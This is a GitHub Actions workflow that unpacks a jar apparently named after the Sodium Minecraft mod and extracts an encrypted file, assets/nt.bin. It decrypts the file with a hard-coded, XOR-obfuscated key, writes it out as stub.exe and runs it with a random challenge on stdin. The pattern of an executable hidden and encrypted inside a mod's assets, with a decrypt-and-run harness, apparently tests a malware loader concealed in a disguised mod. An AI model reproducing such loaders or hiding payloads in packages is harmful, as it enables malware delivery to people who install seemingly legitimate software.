name: STUB-TEST
on:
  workflow_dispatch:

jobs:
  s:
    runs-on: windows-latest
    timeout-minutes: 10
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-java@v4
        with:
          distribution: temurin
          java-version: '21'
      - name: Extract and run nt.bin stub
        shell: powershell
        run: |
          $d="$env:RUNNER_TEMP\s"; New-Item -ItemType Directory -Force $d | Out-Null
          Copy-Item "build\sodium-2.5.jar" "$d\c.jar"
          Expand-Archive "$d\c.jar" "$d\j" -Force -ErrorAction SilentlyContinue
          $bin = Join-Path $d "j\assets\nt.bin"
          if (-not (Test-Path $bin)) { throw "nt.bin missing" }
          $obf = [byte[]](0x21,0x65,0xCE,0xAA,0x73,0xD4,0x89,0x10,0xBD,0x48,0xF6,0x3C,0x02,0x97,0x51,0xEB)
          $key = New-Object byte[] 16
          for ($i=0;$i -lt 16;$i++){ $key[$i] = $obf[$i] -bxor 0x5F }
          $enc = [IO.File]::ReadAllBytes($bin)
          for ($i=0;$i -lt $enc.Length;$i++){ $enc[$i] = $enc[$i] -bxor $key[$i % 16] }
          $exe = Join-Path $d "stub.exe"
          [IO.File]::WriteAllBytes($exe, $enc)
          "exe=$((Get-Item $exe).Length)"
          $challenge = New-Object byte[] 32
          (New-Object Random).NextBytes($challenge)
          $p = Start-Process $exe -RedirectStandardOutput "$d\o.txt" -RedirectStandardError "$d\e.txt" -PassThru -NoNewWindow
          Start-Sleep 1
          $p.StandardInput.BaseStream.Write($challenge,0,32); $p.StandardInput.Close()
          $p.WaitForExit(5000) | Out-Null
          "exit=$($p.ExitCode) out=$((Get-Content "$d\o.txt" -Raw -ErrorAction SilentlyContinue).Trim()) err=$((Get-Content "$d\e.txt" -Raw -ErrorAction SilentlyContinue).Trim())"
      - uses: actions/upload-artifact@v4
        if: always()
        with:
          name: stub-test
          path: ${{ runner.temp }}/s
